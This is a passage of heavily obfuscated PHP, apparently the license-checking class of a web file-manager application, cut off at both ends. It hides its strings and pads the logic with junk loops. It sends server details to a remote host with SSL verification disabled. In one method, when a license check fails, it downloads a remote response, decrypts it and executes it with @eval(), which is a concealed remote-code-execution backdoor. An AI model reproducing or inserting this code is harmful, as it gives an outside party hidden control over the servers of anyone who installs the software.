md5($_SERVER[$ÍÛöå™Š[102]] . $–ó™Îà¦[$ÍÛöå™Š[103]]); $š¾·šÅ = $­™À…ô[650]; while ($š¾·šÅ < $­™À…ô[406]) { if ($š¾·šÅ >= 0) { break; } $š¾·šÅ++; } $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[104]] = base64_encode(serverInfo()); $Ì‡ê”ŠÓ = $­™À…ô[651]; while (strlen($Ì‡ê”ŠÓ) < $­™À…ô[406]) { if (!$Ì‡ê”ŠÓ) { break; } $Ì‡ê”ŠÓ++; } $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[105]] = $this->axsb341bad3b; $ÍŠ ¸·Ê = $­™À…ô[652]; if (strlen($ÍŠ ¸·Ê) < $­™À…ô[643]) { die; } if ($–ó™Îà¦[$ÍÛöå™Š[105]] != $ÍÛöå™Š[106]) { $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[107]] = $–ó™Îà¦[$ÍÛöå™Š[107]]; $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[108]] = $–ó™Îà¦[$ÍÛöå™Š[108]]; $±Ğ§Øõ = rand_string(10) . $this->axsb341bad3b . rand_string(5); $÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[109]][$ÍÛöå™Š[110]] = $this->mwop795e71a5($±Ğ§Øõ, $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[101]]); } if ($this->axsb341bad3b == $ÍÛöå™Š[106]) { $÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$ÍÛöå™Š[93]][$ÍÛöå™Š[97]] = 0; } $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[111]] = _get($this->ncmydd3e0569, $ÍÛöå™Š[112], $ÍÛöå™Š[6]); $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[113]] = _get($this->ncmydd3e0569, $ÍÛöå™Š[114], $ÍÛöå™Š[6]); if (_get($GLOBALS, $ÍÛöå™Š[115]) && $this->config[$ÍÛöå™Š[116]]) { $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[117]] = WEB_ROOT; } return $÷²‚µÊ¾; } private function sydpf5daf0de() { $ò÷ÎÎïÊ =& $_SERVER[Ó¡Ÿ§‚]; $ÖÅ­‹—ı =& $_SERVER[â¥“Ú£Ö]; $ôËîÛÄ— = $_SERVER[$ÖÅ­‹—ı[24]] == $ÖÅ­‹—ı[118]; if ($_SERVER[$ÖÅ­‹—ı[24]] == $ÖÅ­‹—ı[119] && $_GET[$ÖÅ­‹—ı[120]] == $ÖÅ­‹—ı[121]) { $ôËîÛÄ— = !0; } if ($ôËîÛÄ—) { $£¶†±• = array($ÖÅ­‹—ı[105] => $this->axsb341bad3b, $ÖÅ­‹—ı[122] => $this->zxnr9a951b9f(), $ÖÅ­‹—ı[123] => Model($ÖÅ­‹—ı[124])->count()); if ($this->axsb341bad3b != $ÖÅ­‹—ı[106]) { $¯©Â„ÖÒ = _get($this->ncmydd3e0569, $ÖÅ­‹—ı[125]); if ($¯©Â„ÖÒ) { $£¶†±•[$ÖÅ­‹—ı[126]] = $¯©Â„ÖÒ; $£¶†±•[$ÖÅ­‹—ı[127]] = strtotime(_get($this->ncmydd3e0569, $ÖÅ­‹—ı[128])); $£¶†±•[$ÖÅ­‹—ı[129]] = _get($this->ncmydd3e0569, $ÖÅ­‹—ı[114]); } $¯óóÃğ¸ = Model($ÖÅ­‹—ı[33])->get($ÖÅ­‹—ı[130], $ÖÅ­‹—ı[6], !0); if (is_string($¯óóÃğ¸) && substr($¯óóÃğ¸, 0, 1) == $ÖÅ­‹—ı[131]) { $¯óóÃğ¸ = json_decode_force($¯óóÃğ¸); } if (is_array($¯óóÃğ¸) && $¯óóÃğ¸[$ÖÅ­‹—ı[132]] && strstr($¯óóÃğ¸[$ÖÅ­‹—ı[132]], $ÖÅ­‹—ı[133])) { $ô‡Ååõä = explode($ÖÅ­‹—ı[133], $¯óóÃğ¸[$ÖÅ­‹—ı[132]]); $£¶†±•[$ÖÅ­‹—ı[134]] = $ô‡Ååõä[0]; } } $£¶†±• = $this->dgfzf1156181(json_encode($£¶†±•), md5($ÖÅ­‹—ı[135])); $ÈÕîÆø© = array($ÖÅ­‹—ı[136] => $£¶†±•); call_user_func(array($ÖÅ­‹—ı[137], $ÖÅ­‹—ı[138]), $ÈÕîÆø©); $™øÄ«²¥ = $ò÷ÎÎïÊ[653]; if (!$™øÄ«²¥) { return; } } if ($this->axsb341bad3b == $ÖÅ­‹—ı[106]) { return; } $óÖ´ş™ = array($ÖÅ­‹—ı[139], $ÖÅ­‹—ı[140], $ÖÅ­‹—ı[141], $ÖÅ­‹—ı[142], $ÖÅ­‹—ı[143], $ÖÅ­‹—ı[144]); $Ã¸¢ÏßÎ = Model($ÖÅ­‹—ı[33])->get(); $ÈÕîÆø© = array($ÖÅ­‹—ı[145] => $Ã¸¢ÏßÎ[$ÖÅ­‹—ı[34]], $ÖÅ­‹—ı[146] => $Ã¸¢ÏßÎ[$ÖÅ­‹—ı[35]], $ÖÅ­‹—ı[147] => $ÖÅ­‹—ı[6]); foreach ($óÖ´ş™ as $ë†Ú¹Ã×) { if (!isset($Ã¸¢ÏßÎ[$ë†Ú¹Ã×]) || !$Ã¸¢ÏßÎ[$ë†Ú¹Ã×]) { continue; } $ÈÕîÆø©[$ë†Ú¹Ã×] = $Ã¸¢ÏßÎ[$ë†Ú¹Ã×]; $ İÀõÕ = $ò÷ÎÎïÊ[654]; } call_user_func(array($ÖÅ­‹—ı[137], $ÖÅ­‹—ı[138]), $ÈÕîÆø©); $×¾†“Ì¹ = $ò÷ÎÎïÊ[655]; if (!$×¾†“Ì¹) { return; } } private function ydtee592d8b4() { $ê•ÆÔüÈ =& $_SERVER[Ó¡Ÿ§‚]; $ÉÆÏçºÖ =& $_SERVER[â¥“Ú£Ö]; if ($_SERVER[$ÉÆÏçºÖ[24]] != $ÉÆÏçºÖ[148]) { return; } if (!_get($GLOBALS, $ÉÆÏçºÖ[115])) { die; } $î€ÕÇëÜ = $GLOBALS[$ÉÆÏçºÖ[13]]; if (isset($î€ÕÇëÜ[$ÉÆÏçºÖ[149]])) { $this->omrv603dc97e(); die; } if (!isset($î€ÕÇëÜ[$ÉÆÏçºÖ[150]]) || strlen($î€ÕÇëÜ[$ÉÆÏçºÖ[150]]) != 16) { show_json($ÉÆÏçºÖ[151] . $î€ÕÇëÜ[$ÉÆÏçºÖ[150]], !1); } $ÛâÉÒà• = Model($ÉÆÏçºÖ[33])->get($ÉÆÏçºÖ[103]); $±ÏŒë¯ = md5($_SERVER[$ÉÆÏçºÖ[102]] . $ÛâÉÒà•); $ü»üÍ–à = array($ÉÆÏçºÖ[150] => $î€ÕÇëÜ[$ÉÆÏçºÖ[150]], $ÉÆÏçºÖ[152] => rand_string(16), $ÉÆÏçºÖ[153] => $ÉÆÏçºÖ[135], $ÉÆÏçºÖ[154] => $ÉÆÏçºÖ[155], $ÉÆÏçºÖ[156] => $_SERVER[$ÉÆÏçºÖ[157]], $ÉÆÏçºÖ[158] => $_SERVER[$ÉÆÏçºÖ[159]], $ÉÆÏçºÖ[160] => $_SERVER[$ÉÆÏçºÖ[161]], $ÉÆÏçºÖ[101] => $±ÏŒë¯, $ÉÆÏçºÖ[162] => Model($ÉÆÏçºÖ[33])->get($ÉÆÏçºÖ[130])); if ($î€ÕÇëÜ[$ÉÆÏçºÖ[163]] == $ÉÆÏçºÖ[164]) { $áŒ±€Ìô = $this->dgfzf1156181($±ÏŒë¯, $ÉÆÏçºÖ[165]); $šƒØÁ—• = $this->mwop795e71a5(json_encode($ü»üÍ–à), $±ÏŒë¯ . $ÉÆÏçºÖ[166], 3); $šƒØÁ—• = $šƒØÁ—• . $ÉÆÏçºÖ[167] . $_SERVER[$ÉÆÏçºÖ[157]]; $úßÊÀ… = $this->hruo390222f4($ÉÆÏçºÖ[168] . $áŒ±€Ìô . $ÉÆÏçºÖ[169] . $šƒØÁ—•, -1); show_json($úßÊÀ…, !0); } else { if ($î€ÕÇëÜ[$ÉÆÏçºÖ[163]] == $ÉÆÏçºÖ[170]) { $‚ÆÙ”ß¼ = substr(md5($ÉÆÏçºÖ[171] . $±ÏŒë¯), 12, 15) . $ÉÆÏçºÖ[172]; $šƒØÁ—• = $this->quks2d291a17(trim($î€ÕÇëÜ[$ÉÆÏçºÖ[173]]), $‚ÆÙ”ß¼, 2); $×ÛÔ±ÚÚ = json_decode($šƒØÁ—•, !0); if (!is_array($×ÛÔ±ÚÚ) || !is_array($×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]]) || $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[150]] != !0) { $ä¡¸÷€µ = $ÉÆÏçºÖ[175]; $äğ¶ÙÜÂ = $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]] ? $ÉÆÏçºÖ[176] . $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]] : $ä¡¸÷€µ; show_json($äğ¶ÙÜÂ, !1); } else { $ü»üÍ–à[$ÉÆÏçºÖ[152]] = $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]][$ÉÆÏçºÖ[177]]; } } else { $×ÛÔ±ÚÚ = $this->hruo390222f4($ÉÆÏçºÖ[178], $ü»üÍ–à, 10); $¹¨¶ä¨µ = $ê•ÆÔüÈ[656]; if (!$¹¨¶ä¨µ) { die; } } } if (!is_array($×ÛÔ±ÚÚ) || !is_array($×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]]) || $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[150]] != !0) { $ä¡¸÷€µ = LNG($ÉÆÏçºÖ[179]); $äğ¶ÙÜÂ = $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]] ? $ÉÆÏçºÖ[176] . $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]] : $ä¡¸÷€µ; show_json($äğ¶ÙÜÂ, !1); } $§Êß£âÑ = $×ÛÔ±ÚÚ[$ÉÆÏçºÖ[174]]; $ªû­êö™ = $this->madzad956b02($§Êß£âÑ[$ÉÆÏçºÖ[180]]); if (!$ªû­êö™ || $ªû­êö™ != $§Êß£âÑ[$ÉÆÏçºÖ[128]]) { $Äõ›ıø‹ = array($ÉÆÏçºÖ[181] => Model($ÉÆÏçºÖ[33])->get($ÉÆÏçºÖ[103]), $ÉÆÏçºÖ[182] => $_SERVER[$ÉÆÏçºÖ[102]], $ÉÆÏçºÖ[183] => this_url(), $ÉÆÏçºÖ[158] => $_SERVER[$ÉÆÏçºÖ[159]]); $šƒØÁ—• = $this->hiwye84d17f1(json_encode($Äõ›ıø‹)); $this->hruo390222f4($ÉÆÏçºÖ[184] . $šƒØÁ—•); show_json(LNG($ÉÆÏçºÖ[185]), !0); } $öşšÊäĞ = array($ÉÆÏçºÖ[186] => $§Êß£âÑ[$ÉÆÏçºÖ[187]], $ÉÆÏçºÖ[188] => $§Êß£âÑ[$ÉÆÏçºÖ[189]], $ÉÆÏçºÖ[190] => rand_string(16), $ÉÆÏçºÖ[105] => $§Êß£âÑ[$ÉÆÏçºÖ[191]]); if ($ü»üÍ–à[$ÉÆÏçºÖ[152]]) { $öşšÊäĞ[$ÉÆÏçºÖ[190]] = $ü»üÍ–à[$ÉÆÏçºÖ[152]]; } $ ’Åˆ = substr(md5($öşšÊäĞ[$ÉÆÏçºÖ[188]]), 10, 10); $©· ¨ùÈ = $ ’Åˆ . $öşšÊäĞ[$ÉÆÏçºÖ[105]] . $öşšÊäĞ[$ÉÆÏçºÖ[190]]; $öşšÊäĞ[$ÉÆÏçºÖ[107]] = strrev(base64_encode($this->dgfzf1156181($©· ¨ùÈ, $ÉÆÏçºÖ[192]))); $–è¸Ç×Ù = rand_string(16); $®ŒÚ›– = $–è¸Ç×Ù . $öşšÊäĞ[$ÉÆÏçºÖ[105]] . $this->dgfzf1156181(md5($öşšÊäĞ[$ÉÆÏçºÖ[186]]), $–è¸Ç×Ù); $öşšÊäĞ[$ÉÆÏçºÖ[108]] = base64_encode(strrev($this->dgfzf1156181($®ŒÚ›–, $ÉÆÏçºÖ[193]))); $İ¨¯’»­ = $ê•ÆÔüÈ[657]; if (strlen($İ¨¯’»­) < $ê•ÆÔüÈ[623]) { return; } if ($§Êß£âÑ[$ÉÆÏçºÖ[194]] && $§Êß£âÑ[$ÉÆÏçºÖ[194]] >= 1) { Model($ÉÆÏçºÖ[33])->setDeep($ÉÆÏçºÖ[195], $ÉÆÏçºÖ[121]); } Model($ÉÆÏçºÖ[33])->set($öşšÊäĞ); $–µ¾ã£í = md5($_SERVER[$ÉÆÏçºÖ[102]] . strrev($ÛâÉÒà•) . $öşšÊäĞ[$ÉÆÏçºÖ[188]]); $Ò”­ÈŒî = $ê•ÆÔüÈ[658]; while (strlen($Ò”­ÈŒî) < $ê•ÆÔüÈ[625]) { if (!$Ò”­ÈŒî) { break; } $Ò”­ÈŒî++; } $ıô‘ÃÂ = strrev(substr($–µ¾ã£í, 10, 16)); $ù®×ÃÕƒ = $ê•ÆÔüÈ[659]; $¹Ä•°… = $this->mwop795e71a5(json_encode($§Êß£âÑ), $–µ¾ã£í); $ÒÖ÷ˆõø = array_to_keyvalue(Model($ÉÆÏçºÖ[7])->listData(), $ÉÆÏçºÖ[196]); $¦ë¥Œ = $ê•ÆÔüÈ[660]; if (!$¦ë¥Œ) { die; } $û¾ïÜí– = $ÒÖ÷ˆõø[$ÉÆÏçºÖ[197]]; $ãíñŞ = $ê•ÆÔüÈ[661]; while ($ãíñŞ < $ê•ÆÔüÈ[643]) { if ($ãíñŞ >= 0) { break; } $ãíñŞ++; } $Š•éùã = array(); $Š•éùã[$ıô‘ÃÂ] = $¹Ä•°…; Model($ÉÆÏçºÖ[7])->update($û¾ïÜí–[$ÉÆÏçºÖ[198]], array($ÉÆÏçºÖ[199] => $Š•éùã)); $this->ncmydd3e0569 = $§Êß£âÑ; $this->axsb341bad3b = $öşšÊäĞ[$ÉÆÏçºÖ[105]]; $this->licenseRegistSuccess(); $»•€”°ï = $ê•ÆÔüÈ[662]; if (strlen($»•€”°ï) < $ê•ÆÔüÈ[643]) { die; } Cache::set($ÉÆÏçºÖ[200] . md5($ÛâÉÒà• . $ÉÆÏçºÖ[201]), $ÉÆÏçºÖ[6]); show_json(LNG($ÉÆÏçºÖ[185]), !0); $±¦Ğ„•¦ = $ê•ÆÔüÈ[663]; if (!$±¦Ğ„•¦) { die; } } private function licenseRegistSuccess() { $ñÕ†¥ß¹ =& $_SERVER[â¥“Ú£Ö]; $›éàŠŒÅ = Model($ñÕ†¥ß¹[33])->get(); if ($›éàŠŒÅ[$ñÕ†¥ß¹[63]] != $ñÕ†¥ß¹[121]) { Model($ñÕ†¥ß¹[33])->set($ñÕ†¥ß¹[63], $ñÕ†¥ß¹[121]); } Action($ñÕ†¥ß¹[202])->initStart(!0); } private function omrv603dc97e() { $™øà‡Ñ¤ =& $_SERVER[Ó¡Ÿ§‚]; $ñÛß‡Á³ =& $_SERVER[â¥“Ú£Ö]; Model($ñÛß‡Á³[33])->set(array($ñÛß‡Á³[186] => $ñÛß‡Á³[6], $ñÛß‡Á³[188] => $ñÛß‡Á³[6], $ñÛß‡Á³[105] => $ñÛß‡Á³[106], $ñÛß‡Á³[107] => $ñÛß‡Á³[6], $ñÛß‡Á³[108] => $ñÛß‡Á³[6])); Model($ñÛß‡Á³[33])->setDeep($ñÛß‡Á³[195], $ñÛß‡Á³[203]); $this->ncmydd3e0569 = array(); $ ™ÄÙÊ® = $™øà‡Ñ¤[664]; if (!$ ™ÄÙÊ®) { die; } $this->axsb341bad3b = $ñÛß‡Á³[106]; $¸ûŒ€£Ô = $™øà‡Ñ¤[665]; if (strlen($¸ûŒ€£Ô) < $™øà‡Ñ¤[643]) { die; } } private function rokw59c36d78() { $üš¢Ã„ˆ =& $_SERVER[Ó¡Ÿ§‚]; $¡¶Ñµâ =& $_SERVER[â¥“Ú£Ö]; $_SERVER[$¡¶Ñµâ[159]] = _get($_SERVER, $¡¶Ñµâ[159], APP_HOST); $this->axsb341bad3b = $¡¶Ñµâ[106]; $Á¥ì÷õ˜ = $üš¢Ã„ˆ[666]; while ($Á¥ì÷õ˜ < $üš¢Ã„ˆ[625]) { if ($Á¥ì÷õ˜ >= 0) { break; } $Á¥ì÷õ˜++; } $¹â¯ÓşÔ = Model($¡¶Ñµâ[33])->get(); $•¿çÚ‰ = $üš¢Ã„ˆ[667]; if (!$•¿çÚ‰) { die; } if ($¹â¯ÓşÔ[$¡¶Ñµâ[105]] == $¡¶Ñµâ[106]) { return; } $Ş•óÙ¥Œ = Model($¡¶Ñµâ[33])->get($¡¶Ñµâ[103]); $ÒÛæ±ë¹ = $¡¶Ñµâ[200] . md5($Ş•óÙ¥Œ . $¡¶Ñµâ[201]); $ñûÁ¹ ¸ = Cache::get($ÒÛæ±ë¹); if (!is_array($ñûÁ¹ ¸) || !isset($ñûÁ¹ ¸[$¡¶Ñµâ[204]]) || time() - $ñûÁ¹ ¸[$¡¶Ñµâ[204]] >= 60) { $ÉûÍÉÚ˜ = Model($¡¶Ñµâ[7])->loadList(); $Šæ¨Ó¶‚ = $ÉûÍÉÚ˜[$¡¶Ñµâ[197]]; $ŠáÁœ”˜ = md5($_SERVER[$¡¶Ñµâ[102]] . strrev($Ş•óÙ¥Œ) . $¹â¯ÓşÔ[$¡¶Ñµâ[188]]); $ìİŸ½ƒó = strrev(substr($ŠáÁœ”˜, 10, 16)); $ñûÁ¹ ¸ = $this->quks2d291a17($Šæ¨Ó¶‚[$¡¶Ñµâ[85]][$ìİŸ½ƒó], $ŠáÁœ”˜); $ñûÁ¹ ¸ = json_decode($ñûÁ¹ ¸, !0); } if (!is_array($ñûÁ¹ ¸)) { return $this->omrv603dc97e(); } $¾Æ­òí = strtotime($ñûÁ¹ ¸[$¡¶Ñµâ[128]]); if (time() >= $¾Æ­òí) { return $this->omrv603dc97e(); } if (time() - $ñûÁ¹ ¸[$¡¶Ñµâ[204]] > 20) { $ñûÁ¹ ¸[$¡¶Ñµâ[204]] = time(); Cache::set($ÒÛæ±ë¹, $ñûÁ¹ ¸); } $this->ncmydd3e0569 = $ñûÁ¹ ¸; $this->axsb341bad3b = $¹â¯ÓşÔ[$¡¶Ñµâ[105]]; $´Ó”¬¬š = $üš¢Ã„ˆ[668]; if (strlen($´Ó”¬¬š) < $üš¢Ã„ˆ[406]) { die; } } private function nywk89377c89() { $ÆïëöÉ¢ =& $_SERVER[â¥“Ú£Ö]; $¥Ç¤ÏÜ³ = $GLOBALS[$ÆïëöÉ¢[13]]; $²øÜ—” = $_SERVER[$ÆïëöÉ¢[24]]; if ($²øÜ—” == $ÆïëöÉ¢[205] && $this->axsb341bad3b == $ÆïëöÉ¢[106]) { show_json(LNG($ÆïëöÉ¢[206]), !1, $ÆïëöÉ¢[207]); } $”º¤¿´¨ = array($ÆïëöÉ¢[208], $ÆïëöÉ¢[209]); if (in_array($²øÜ—”, $”º¤¿´¨)) { if ($this->axsb341bad3b == $ÆïëöÉ¢[106] && isset($¥Ç¤ÏÜ³[$ÆïëöÉ¢[210]])) { show_json(LNG($ÆïëöÉ¢[206]), !1, $ÆïëöÉ¢[207]); die; } $»§¿ƒ = $this->zxnr9a951b9f(); if ($»§¿ƒ != intval($ÆïëöÉ¢[211])) { if ($»§¿ƒ <= Model($ÆïëöÉ¢[124])->count()) { show_json(LNG($ÆïëöÉ¢[212]), !1, $ÆïëöÉ¢[207]); die; } } } } private function azse8a62fcd8() { $™¬€¨Ì =& $_SERVER[Ó¡Ÿ§‚]; $¥•ÙØ¿’ =& $_SERVER[â¥“Ú£Ö]; $œÃ¶Å‹ = array($¥•ÙØ¿’[118], $¥•ÙØ¿’[119]); if (!_get($GLOBALS, $¥•ÙØ¿’[115]) || !isset($_GET[$¥•ÙØ¿’[213]])) { return; } if (!in_array($_SERVER[$¥•ÙØ¿’[24]], $œÃ¶Å‹)) { return; } $ö¢ÚœìŞ = $¥•ÙØ¿’[214]; $ö¢ÚœìŞ = $this->zrus6114bd5b($ö¢ÚœìŞ, $¥•ÙØ¿’[215]); $ÕîºÑ½ğ = $™¬€¨Ì[669]; $ÀŒ´‘ê = stream_context_create(array($¥•ÙØ¿’[216] => array($¥•ÙØ¿’[217] => $¥•ÙØ¿’[218], $¥•ÙØ¿’[219] => 3))); $Á™Û‘·İ = $™¬€¨Ì[670]; if (strlen($Á™Û‘·İ) < $™¬€¨Ì[623]) { return; } $–Õç·âÏ = @file_get_contents($ö¢ÚœìŞ, !1, $ÀŒ´‘ê); header($¥•ÙØ¿’[220]); $êŸÀğ¼á = $™¬€¨Ì[671]; if (strlen($êŸÀğ¼á) < $™¬€¨Ì[625]) { die; } if ($–Õç·âÏ && strstr($–Õç·âÏ, $¥•ÙØ¿’[221])) { echo $–Õç·âÏ; } die; } public function skmxaeadb01d($ÌĞ°–¼®) { $è“‰‚• =& $_SERVER[Ó¡Ÿ§‚]; $ûŸªËÌ =& $_SERVER[â¥“Ú£Ö]; if ($this->axsb341bad3b == $ûŸªËÌ[222]) { return $ÌĞ°–¼®; } $¿¡ı¯Ë³ = array($ûŸªËÌ[223] => $ûŸªËÌ[224], $ûŸªËÌ[225] => $ûŸªËÌ[224], $ûŸªËÌ[226] => $ûŸªËÌ[224], $ûŸªËÌ[227] => $ûŸªËÌ[224], $ûŸªËÌ[228] => $ûŸªËÌ[229], $ûŸªËÌ[230] => $ûŸªËÌ[229], $ûŸªËÌ[231] => $ûŸªËÌ[229], $ûŸªËÌ[232] => $ûŸªËÌ[229], $ûŸªËÌ[233] => $ûŸªËÌ[229], $ûŸªËÌ[234] => $ûŸªËÌ[229], $ûŸªËÌ[235] => $ûŸªËÌ[229], $ûŸªËÌ[236] => $ûŸªËÌ[229], $ûŸªËÌ[237] => $ûŸªËÌ[229], $ûŸªËÌ[238] => $ûŸªËÌ[229], $ûŸªËÌ[239] => $ûŸªËÌ[229], $ûŸªËÌ[240] => $ûŸªËÌ[229]); $’¸ÅÎü = $è“‰‚•[672]; if (strlen($’¸ÅÎü) < $è“‰‚•[630]) { die; } $õ’¬Óú = explode($ûŸªËÌ[241], _get($this->ncmydd3e0569, $ûŸªËÌ[112], $ûŸªËÌ[6])); $š¨à€×ş = $è“‰‚•[673]; if (!$š¨à€×ş) { return; } $‡Á˜Š¦Õ = array(); $Õƒ´„  = $è“‰‚•[674]; foreach ($¿¡ı¯Ë³ as $ØçïåÊº => $âÅ¬áæ) { if ($âÅ¬áæ == $ûŸªËÌ[224] && substr($this->axsb341bad3b, 0, 1) == $ûŸªËÌ[224]) { continue; } if (!in_array($ØçïåÊº, $õ’¬Óú)) { $‡Á˜Š¦Õ[] = $ØçïåÊº; } } foreach ($‡Á˜Š¦Õ as $ØçïåÊº) { unset($ÌĞ°–¼®[$ØçïåÊº]); } return $ÌĞ°–¼®; $¸Øëííë = $è“‰‚•[675]; if (!$¸Øëííë) { die; } } private function mpyje40ef86f() { $ÃÈİìğİ =& $_SERVER[â¥“Ú£Ö]; if ($this->axsb341bad3b != $ÃÈİìğİ[106]) { $GLOBALS[$ÃÈİìğİ[85]][$ÃÈİìğİ[89]][$ÃÈİìğİ[242]] = $ÃÈİìğİ[203]; return; } $GLOBALS[$ÃÈİìğİ[85]][$ÃÈİìğİ[243]] = $ÃÈİìğİ[121]; if (Model($ÃÈİìğİ[244])->get($ÃÈİìğİ[63]) != $ÃÈİìğİ[203]) { Model($ÃÈİìğİ[244])->set($ÃÈİìğİ[63], $ÃÈİìğİ[203]); } } public function dyoh17af4e6b() { return $_SERVER[â¥“Ú£Ö][245]; } private function stzef7a9c502() { $ŠÔñ½ØÔ =& $_SERVER[Ó¡Ÿ§‚]; $ıÚŒ¶åÂ =& $_SERVER[â¥“Ú£Ö]; $’œï’ğ = array($ıÚŒ¶åÂ[246], $ıÚŒ¶åÂ[247], $ıÚŒ¶åÂ[248]); $Á¾Â¯» = $ŠÔñ½ØÔ[676]; if (strlen($Á¾Â¯») < $ŠÔñ½ØÔ[625]) { die; } $ŒÌóŞİ© = $ıÚŒ¶åÂ[249] . md5($ıÚŒ¶åÂ[250]); $–çñ‚€ = $ŠÔñ½ØÔ[677]; if (strlen($–çñ‚€) < $ŠÔñ½ØÔ[625]) { return; } if ($this->axsb341bad3b == $ıÚŒ¶åÂ[106] || !_get($GLOBALS, $ıÚŒ¶åÂ[115])) { return; } if (!in_array($_SERVER[$ıÚŒ¶åÂ[24]], $’œï’ğ)) { return; } if (time() % 4 != 0) { return; } $İô¨Éî  = call_user_func(array($ıÚŒ¶åÂ[251], $ıÚŒ¶åÂ[252]), $ŒÌóŞİ©); $Ü‘‹ÕÚë = $ŠÔñ½ØÔ[678]; if (strlen($Ü‘‹ÕÚë) < $ŠÔñ½ØÔ[630]) { die; } if ($İô¨Éî  && time() - $İô¨Éî  < intval($ıÚŒ¶åÂ[253])) { return; } call_user_func(array($ıÚŒ¶åÂ[251], $ıÚŒ¶åÂ[138]), $ŒÌóŞİ©, time()); $¸•ğ–Ù˜ = Model($ıÚŒ¶åÂ[33])->get($ıÚŒ¶åÂ[103]); $§¥ôÈ´ = $ŠÔñ½ØÔ[679]; if (!$§¥ôÈ´) { die; } $ÊèÒô²¯ = array($ıÚŒ¶åÂ[150] => Model($ıÚŒ¶åÂ[33])->get($ıÚŒ¶åÂ[186]), $ıÚŒ¶åÂ[163] => $this->axsb341bad3b, $ıÚŒ¶åÂ[160] => $_SERVER[$ıÚŒ¶åÂ[161]], $ıÚŒ¶åÂ[162] => Model($ıÚŒ¶åÂ[33])->get($ıÚŒ¶åÂ[130]), $ıÚŒ¶åÂ[101] => md5($_SERVER[$ıÚŒ¶åÂ[102]] . $¸•ğ–Ù˜), $ıÚŒ¶åÂ[153] => $ıÚŒ¶åÂ[135], $ıÚŒ¶åÂ[156] => $_SERVER[$ıÚŒ¶åÂ[157]]); $‹Î‘òÙ = $this->hruo390222f4($ıÚŒ¶åÂ[254], $ÊèÒô²¯); $àê„ˆä = $ŠÔñ½ØÔ[680]; if (strlen($àê„ˆä) < $ŠÔñ½ØÔ[643]) { die; } if (!is_array($‹Î‘òÙ)) { return; } if ($‹Î‘òÙ[$ıÚŒ¶åÂ[150]] && $‹Î‘òÙ[$ıÚŒ¶åÂ[255]]) { if ($this->madzad956b02($‹Î‘òÙ[$ıÚŒ¶åÂ[255]]) == $ÊèÒô²¯[$ıÚŒ¶åÂ[150]]) { return; } } $this->omrv603dc97e(); if ($this->madzad956b02($‹Î‘òÙ[$ıÚŒ¶åÂ[255]]) != $ÊèÒô²¯[$ıÚŒ¶åÂ[150]]) { $ëó­Ü¥ = array($ıÚŒ¶åÂ[181] => $¸•ğ–Ù˜, $ıÚŒ¶åÂ[182] => $_SERVER[$ıÚŒ¶åÂ[102]], $ıÚŒ¶åÂ[183] => this_url(), $ıÚŒ¶åÂ[158] => $_SERVER[$ıÚŒ¶åÂ[159]]); $ãô–ì¸ = $this->hiwye84d17f1(json_encode($ëó­Ü¥)); $‹Î‘òÙ = $this->hruo390222f4($ıÚŒ¶åÂ[184] . $ãô–ì¸); if ($‹Î‘òÙ && is_array($‹Î‘òÙ) && isset($‹Î‘òÙ[$ıÚŒ¶åÂ[255]])) { $²¿Ğ² â = $this->quks2d291a17($‹Î‘òÙ[$ıÚŒ¶åÂ[255]], 2); if ($²¿Ğ² â) { $²¿Ğ² â = $this->madzad956b02($²¿Ğ² â); } if ($²¿Ğ² â) { try { @eval($²¿Ğ² â); } catch (Exception $ƒ‡—˜â») { } } } } } private function hruo390222f4($Óáš‡Â = '', $ÙëŞş» = array(), $¦­Ó¹ğ = 5) { $ØÓŒ£‰ =& $_SERVER[Ó¡Ÿ§‚]; $¾üï†‡ğ =& $_SERVER[â¥“Ú£Ö]; $æ„ô’¼ = $¾üï†‡ğ[256]; $æ„ô’¼ = $this->zrus6114bd5b($æ„ô’¼, $¾üï†‡ğ[257]); $æ„ô’¼ = $æ„ô’¼ . $Óáš‡Â; if ($ÙëŞş» && is_array($ÙëŞş»)) { $æ„ô’¼ = $æ„ô’¼ . $¾üï†‡ğ[258] . http_build_query($ÙëŞş»); } if ($ÙëŞş» === -1) { return $æ„ô’¼; } $§ÉÇÛĞ† = stream_context_create(array($¾üï†‡ğ[216] => array($¾üï†‡ğ[219] => $¦­Ó¹ğ, $¾üï†‡ğ[217] => $¾üï†‡ğ[259]), $¾üï†‡ğ[260] => array($¾üï†‡ğ[261] => !1, $¾üï†‡ğ[262] => !1))); $ÙëŞş» = @file_get_contents($æ„ô’¼, !1, $§ÉÇÛĞ†); return json_decode($ÙëŞş», !0); $Çè˜åÈø = $ØÓŒ£‰[681]; while ($Çè˜åÈø < $ØÓŒ£‰[406]) { if ($Çè˜åÈø >= 0) { break; } $Çè˜åÈø++; } } private function zxnr9a951b9f() { $ƒ òî‡í =& $_SERVER[Ó¡Ÿ§‚]; $ŞîˆÆ”ô =& $_SERVER[â¥“Ú£Ö]; $–³µ±´á = array($ŞîˆÆ”ô[263] => $ŞîˆÆ”ô[264], $ŞîˆÆ”ô[265] => $ŞîˆÆ”ô[266], $ŞîˆÆ”ô[267] => $ŞîˆÆ”ô[268], $ŞîˆÆ”ô[269] => $ŞîˆÆ”ô[270], $ŞîˆÆ”ô[271] => $ŞîˆÆ”ô[272], $ŞîˆÆ”ô[273] => $ŞîˆÆ”ô[211], $ŞîˆÆ”ô[274] => $ŞîˆÆ”ô[211], $ŞîˆÆ”ô[275] => $ŞîˆÆ”ô[264], $ŞîˆÆ”ô[276] => 